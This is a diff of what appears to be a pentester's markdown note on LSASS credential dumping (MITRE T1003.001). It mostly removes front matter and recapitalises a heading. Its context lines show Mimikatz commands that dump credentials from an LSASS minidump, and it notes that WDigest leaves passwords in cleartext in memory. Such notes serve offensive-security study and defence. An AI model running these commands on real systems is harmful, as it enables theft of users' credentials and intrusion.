@@ -1,12 +1,4 @@
----
-date: 
-tags:
-  - ActiveDirectory
-  - LSASS
----
 
-```table-of-contents
-```
 
 https://attack.mitre.org/techniques/T1003/001/
 
@@ -63,7 +55,7 @@ Invoke-Mimikatz -Command "sekurlsa::Minidump lsass_dump.dmp"
 Invoke-Mimikatz -Command "sekurlsa::logonPasswords /full"
 ```
 
-# Dumping cleartext credentials
+# Dumping Cleartext Credentials
 
 The storage mechanism used by WDigest stores passwords in clear text in memory. If an adversary gains access to a system , they can utilize tools like Mimikatz and Lsassy to retrieve not only the password hashes stored in memory, but also the actual passwords in clear text
 
